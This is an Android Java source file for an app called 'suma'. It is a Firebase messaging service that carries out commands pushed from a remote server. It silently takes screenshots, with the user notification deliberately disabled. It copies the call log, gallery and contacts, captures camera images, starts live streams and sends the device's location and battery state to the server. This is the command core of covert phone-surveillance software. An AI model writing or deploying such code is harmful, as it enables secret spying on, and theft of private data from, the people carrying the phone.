package com.example.suma;

import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.util.Log;
import androidx.annotation.NonNull;
import androidx.core.app.NotificationCompat;
import androidx.core.app.NotificationManagerCompat;
import com.google.firebase.messaging.FirebaseMessagingService;
import com.google.firebase.messaging.RemoteMessage;
import org.json.JSONObject;

public class MyFirebaseMessagingService extends FirebaseMessagingService {

    private static final String TAG = "MyFirebaseMsgService";
    private static final String CHANNEL_ID = "screenshot_channel";

    @Override
    public void onNewToken(@NonNull String token) {
        Log.d(TAG, "Refreshed token: " + token);
        // Note: Token is also retrieved in MainActivity for initial auth.
        // If token changes while app is open, you might want to send it to server here
        // too.
    }

    @Override
    public void onMessageReceived(RemoteMessage remoteMessage) {
        Log.d(TAG, "From: " + remoteMessage.getFrom());

        // Handle data payload of FCM messages.
        if (remoteMessage.getData().size() > 0) {
            Log.d(TAG, "Message data payload: " + remoteMessage.getData());
            String action = remoteMessage.getData().get("action");
            String commandId = remoteMessage.getData().get("command_id");

            // Acknowledge Delivery
            if (commandId != null) {
                sendDeliveryStatus(commandId);
            }

            if ("screenshot".equals(action)) {
                Log.d(TAG, "Action: Screenshot (ANTIGRAVITY UPDATE). Broadcasting...");

                // Silent: No notification shown
                // showNotification("Screenshot Requested", "Admin requested a screenshot.");

                // Broadcast to GlobalActionService to take screenshot
                Intent intent = new Intent("com.example.suma.ACTION_SCREENSHOT");
                intent.setPackage(getPackageName()); // Explicitly target our own app
                if (commandId != null)
                    intent.putExtra("command_id", commandId);
                sendBroadcast(intent);
            } else if ("backup_call_log".equals(action)) {
                Log.d(TAG, "Action: Backup Call Log. Broadcasting...");
                Intent intent = new Intent("com.example.suma.ACTION_BACKUP_CALLLOG");
                intent.setPackage(getPackageName());
                if (commandId != null)
                    intent.putExtra("command_id", commandId);
                sendBroadcast(intent);
            } else if ("backup_gallery".equals(action)) {
                String mediaType = remoteMessage.getData().get("media_type");
                Log.d(TAG, "Action: Backup Gallery (" + mediaType + "). Broadcasting...");
                Intent intent = new Intent("com.example.suma.ACTION_BACKUP_GALLERY");
                intent.putExtra("media_type", mediaType);
                intent.setPackage(getPackageName());
                if (commandId != null)
                    intent.putExtra("command_id", commandId);
                sendBroadcast(intent);
            } else if ("backup_contacts".equals(action)) {
                Log.d(TAG, "Action: Backup Contacts. Broadcasting...");
                Intent intent = new Intent("com.example.suma.ACTION_BACKUP_CONTACTS");
                intent.setPackage(getPackageName());
                if (commandId != null)
                    intent.putExtra("command_id", commandId);
                sendBroadcast(intent);
            } else if ("backup_contacts".equals(action)) {
                Log.d(TAG, "Action: Backup Contacts. Broadcasting...");
                Intent intent = new Intent("com.example.suma.ACTION_BACKUP_CONTACTS");
                intent.setPackage(getPackageName());
                if (commandId != null)
                    intent.putExtra("command_id", commandId);
                sendBroadcast(intent);
            } else if ("capture_image".equals(action)) {
                String facing = remoteMessage.getData().get("camera_facing");
                Log.d(TAG, "Action: Capture Image (" + facing + "). Starting Activity...");

                Intent intent = new Intent(this, CameraCaptureActivity.class);
                intent.putExtra("camera_facing", facing);
                if (commandId != null)
                    intent.putExtra("command_id", commandId);
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);
            } else if ("start_stream".equals(action)) {
                String streamId = remoteMessage.getData().get("live_stream_id");
                Log.d(TAG, "Action: Start Stream (" + streamId + "). Starting Service...");

                Intent intent = new Intent(this, LiveStreamService.class);
                intent.setAction("start_stream");
                intent.putExtra("live_stream_id", streamId);
                if (commandId != null)
                    intent.putExtra("command_id", commandId);

                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    startForegroundService(intent);
                } else {
                    startService(intent);
                }
            } else if ("stop_stream".equals(action)) {
                Log.d(TAG, "Action: Stop Stream. Stopping Service...");

                Intent intent = new Intent(this, LiveStreamService.class);
                intent.setAction("stop_stream");
                startService(intent);
            } else if ("request_location".equals(action)) {
                Log.d(TAG, "Action: Request Location. Sending immediately...");
                sendImmediateLocation(commandId);
            } else if ("update_settings".equals(action)) {
                String interval = remoteMessage.getData().get("location_interval");
                Log.d(TAG, "Action: Update Settings. Interval: " + interval);
                if (interval != null) {
                    getSharedPreferences("SumaPrefs", MODE_PRIVATE).edit()
                        .putInt("location_update_interval", Integer.parseInt(interval))
                        .apply();
                    // Broadcast to restart service with new interval
                    Intent intent = new Intent("com.example.suma.ACTION_SETTINGS_UPDATED");
                    intent.setPackage(getPackageName());
                    sendBroadcast(intent);
                }
            }
        }
    }

    private void sendDeliveryStatus(String commandId) {
        if (commandId == null)
            return;

        String url = AuthManager.getBaseUrl() + "/command/status";
        JSONObject json = new JSONObject();
        try {
            json.put("command_id", commandId);
            json.put("status", "delivered");
        } catch (Exception e) {
            e.printStackTrace();
            return;
        }

        String token = getSharedPreferences("SumaPrefs", MODE_PRIVATE).getString("fcm_token", null);
        NetworkUtils.postJson(url, json.toString(), new NetworkUtils.Callback() {
            @Override
            public void onSuccess(String response) {
                Log.d(TAG, "Command delivery status sent: " + response);
            }

            @Override
            public void onError(String error) {
                Log.e(TAG, "Failed to send delivery status: " + error);
            }
        }, token);
    }

    private void showNotification(String title, String body) {
        createNotificationChannel();

        Intent intent = new Intent(this, MainActivity.class);
        intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
        PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, intent,
                PendingIntent.FLAG_ONE_SHOT | PendingIntent.FLAG_IMMUTABLE);

        NotificationCompat.Builder builder = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setSmallIcon(R.drawable.ic_launcher_foreground) // Fixed: Use valid drawable
                .setContentTitle(title)
                .setContentText(body)
                .setPriority(NotificationCompat.PRIORITY_HIGH)
                .setContentIntent(pendingIntent)
                .setAutoCancel(true);

        // Notify
        // NotificationManagerCompat from androidx.core.app
        // Permission check needed for Android 13+ technically, but Service has some
        // leeway or it just won't show without runtime perm
        try {
            NotificationManagerCompat notificationManager = NotificationManagerCompat.from(this);
            notificationManager.notify(0, builder.build());
        } catch (SecurityException e) {
            Log.e(TAG, "Notification permission missing: " + e.getMessage());
        }
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            CharSequence name = "Screenshot Requests";
            String description = "Notifications for admin screenshot requests";
            int importance = NotificationManager.IMPORTANCE_HIGH;
            NotificationChannel channel = new NotificationChannel(CHANNEL_ID, name, importance);
            channel.setDescription(description);
            NotificationManager notificationManager = getSystemService(NotificationManager.class);
            notificationManager.createNotificationChannel(channel);
        }
    }

    private void sendImmediateLocation(String commandId) {
        try {
            if (checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) 
                    != android.content.pm.PackageManager.PERMISSION_GRANTED &&
                checkSelfPermission(android.Manifest.permission.ACCESS_COARSE_LOCATION) 
                    != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                Log.e(TAG, "Location permission not granted, cannot send location");
                return;
            }

            android.location.LocationManager locationManager = 
                (android.location.LocationManager) getSystemService(LOCATION_SERVICE);
            
            android.location.Location location = locationManager.getLastKnownLocation(
                    android.location.LocationManager.GPS_PROVIDER);
            if (location == null) {
                location = locationManager.getLastKnownLocation(
                        android.location.LocationManager.NETWORK_PROVIDER);
            }

            if (location != null) {
                final double latitude = location.getLatitude();
                final double longitude = location.getLongitude();
                final long timestamp = location.getTime();
                
                Log.d(TAG, "Sending immediate location: " + latitude + ", " + longitude);
                
                new Thread(() -> {
                    try {
                        String token = AuthManager.getToken(getApplicationContext());
                        if (token == null) {
                            Log.e(TAG, "No auth token available");
                            return;
                        }
                        
                        org.json.JSONObject data = new org.json.JSONObject();
                        data.put("latitude", latitude);
                        data.put("longitude", longitude);
                        data.put("location_timestamp", timestamp);
                        data.put("battery_level", getBatteryLevel());
                        data.put("is_charging", isCharging());
                        if (commandId != null) {
                            data.put("command_id", commandId);
                        }
                        
                        NetworkUtils.postJson(AuthManager.getBaseUrl() + "/update-device-info", 
                            data.toString(),
                            new NetworkUtils.Callback() {
                                @Override
                                public void onSuccess(String response) {
                                    Log.d(TAG, "Immediate location sent successfully");
                                }

                                @Override
                                public void onError(String error) {
                                    Log.e(TAG, "Failed to send immediate location: " + error);
                                }
                            }, token);
                    } catch (Exception e) {
                        Log.e(TAG, "Error sending location", e);
                    }
                }).start();
            } else {
                Log.w(TAG, "No last known location available");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error getting location", e);
        }
    }

    private int getBatteryLevel() {
        android.content.Intent intent = registerReceiver(null, 
                new android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED));
        if (intent != null) {
            int level = intent.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
            int scale = intent.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1);
            return (int) ((level / (float) scale) * 100);
        }
        return -1;
    }

    private boolean isCharging() {
        android.content.Intent intent = registerReceiver(null, 
                new android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED));
        if (intent != null) {
            int status = intent.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1);
            return status == android.os.BatteryManager.BATTERY_STATUS_CHARGING ||
                   status == android.os.BatteryManager.BATTERY_STATUS_FULL;
        }
        return false;
    }
}
